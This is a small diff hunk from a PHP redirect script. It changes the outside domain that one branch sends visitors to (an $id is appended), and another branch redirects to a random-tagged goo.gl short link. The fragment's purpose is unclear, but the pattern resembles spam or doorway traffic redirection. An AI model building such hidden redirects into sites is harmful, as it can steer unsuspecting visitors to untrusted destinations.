@@ -123,7 +123,7 @@
 		header('Location: https://goo.gl/LDKFzF?'.rand(11111,99999));
 	}else if($action == 'site'){
 		$app_site = getSite();
-		header("Location: http://karalarid.info/$id");
+		header("Location: http://cvchaber.info/$id");
 	}else{
 		@ob_end_clean();
 		@ob_end_flush();
